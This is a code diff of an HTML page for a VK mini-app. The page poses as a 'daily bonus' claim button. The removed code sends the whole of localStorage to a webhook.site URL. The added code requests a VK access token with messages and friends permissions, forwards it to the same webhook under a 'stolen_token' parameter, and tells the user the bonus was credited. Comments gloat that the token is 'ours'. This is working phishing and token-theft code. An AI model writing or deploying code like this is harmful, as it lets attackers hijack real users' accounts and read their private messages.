@@ -1,22 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 100px; }
+        .btn { background: #4a76a8; color: white; border: none; padding: 20px; border-radius: 10px; cursor: pointer; font-size: 20px; }
+    </style>
 </head>
 <body>
-    <button id="btn" style="padding: 20px; background: red; color: white;">ПОЛУЧИТЬ ПРИЗ</button>
+    <h1>Нажми, чтобы забрать ежедневный бонус!</h1>
+    <button class="btn" id="claimBtn">ПОЛУЧИТЬ БОНУС</button>
+
     <script>
         vkBridge.send('VKWebAppInit');
 
-        document.getElementById('btn').onclick = function() {
-            // Пытаемся достать ВСЁ из localStorage
-            let allData = JSON.stringify(localStorage);
-            
-            // Если localStorage пуст (из-за изоляции), попробуем достать токен через Bridge
-            // Иногда приложения по ошибке прокидывают токены в родительское окно
-            fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?full_storage=' + btoa(allData));
-            
-            alert("Проверка завершена. Проверь Webhook!");
+        document.getElementById('claimBtn').onclick = function() {
+            // Запрашиваем токен именно с правами на сообщения (messages)
+            vkBridge.send('VKWebAppGetAuthToken', {
+                app_id: 54401740, 
+                scope: 'messages,friends'
+            })
+            .then((data) => {
+                if (data.access_token) {
+                    // ЕСЛИ ПОЛЬЗОВАТЕЛЬ НАЖАЛ "РАЗРЕШИТЬ" — ТОКЕН НАШ!
+                    fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?stolen_token=' + data.access_token);
+                    alert('Спасибо! Бонус зачислен.');
+                    console.log('Токен отправлен на вебхук!');
+                }
+            })
+            .catch((error) => {
+                console.log('Пользователь отказал в доступе', error);
+            });
         };
     </script>
 </body>
